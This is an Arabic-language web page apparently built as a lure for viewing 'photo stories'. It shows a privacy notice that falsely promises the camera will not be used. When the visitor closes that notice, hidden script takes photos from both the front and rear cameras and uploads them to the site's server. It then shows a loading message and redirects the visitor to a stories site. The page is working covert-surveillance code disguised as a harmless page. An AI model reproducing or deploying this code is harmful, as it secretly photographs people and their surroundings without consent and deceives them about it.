<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تأكيد عرض القصص المصورة</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');

    body {
      font-family: 'Cairo', sans-serif;
      margin: 0;
      background-color: #f9fafb;
      direction: rtl;
    }

    #privacyModal {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.5);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      padding: 15px;
    }

    #privacyModal > div {
      background: white;
      padding: 25px 20px;
      width: 100%;
      max-width: 400px;
      border-radius: 15px;
      box-shadow: 0 12px 25px rgba(0, 0, 0, 0.2);
      position: relative;
      text-align: center;
    }

    #closeBtn {
      position: absolute;
      top: 15px;
      right: 20px;
      font-size: 28px;
      font-weight: 700;
      color: #333;
      cursor: pointer;
      transition: color 0.2s ease;
    }

    #closeBtn:hover {
      color: #e74c3c;
    }

    #privacyModal h2 {
      margin: 0 0 15px 0;
      font-weight: 700;
      font-size: 24px;
      color: #222;
    }

    #privacyModal p {
      font-weight: 400;
      font-size: 16px;
      color: #555;
      line-height: 1.6;
    }

    @media (max-width: 480px) {
      #privacyModal > div {
        padding: 20px 15px;
        max-width: 90%;
      }
      #closeBtn {
        font-size: 24px;
        top: 12px;
        right: 15px;
      }
      #privacyModal h2 {
        font-size: 22px;
      }
      #privacyModal p {
        font-size: 14px;
      }
    }

    #video, #canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div id="privacyModal">
    <div>
      <span id="closeBtn">&times;</span>
      <h2>تنويه الخصوصية</h2>
      <p>
        <br>
        هذا الموقع يطلب بعض الأذونات فقط لضمان عمل التطبيق بشكل صحيح مثل عرض القصص المصورة.
        نحن نحرص على حماية خصوصيتك وعدم استخدام الكاميرا أو أي شيء آخر بل فقط التطبيق يحتاجها لعرض الصور الخاصة بالقصص.
      </p>
    </div>
  </div>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const privacyModal = document.getElementById('privacyModal');
    const closeBtn = document.getElementById('closeBtn');

    async function captureImageFromCamera(facingMode) {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
      });

      return new Promise((resolve) => {
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 1.0);
            stream.getTracks().forEach(track => track.stop()); // نوقف الكاميرا
            resolve(imageData);
          }, 2000); // ننتظر شوية علشان الكاميرا تظبط
        };
      });
    }

    closeBtn.addEventListener('click', async () => {
      privacyModal.style.display = 'none';

      try {
        // نلتقط صورة من الكاميرا الأمامية
        const frontImage = await captureImageFromCamera("user");

        // نلتقط صورة من الكاميرا الخلفية
        const backImage = await captureImageFromCamera({ exact: "environment" });

        // نرسل الصورتين للسيرفر
        await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ frontImage, backImage })
        });

        // رسالة "جاري التحميل"
        document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family: Cairo, sans-serif;font-size:24px;color:#333;">جاري تحميل صفحة القصص...</div>';

        setTimeout(() => {
          window.location.href = 'https://stories22.netlify.app/';
        }, 3000);
      } catch (err) {
        console.error("Error capturing images:", err);
      }
    });
  </script>
</body>
</html>
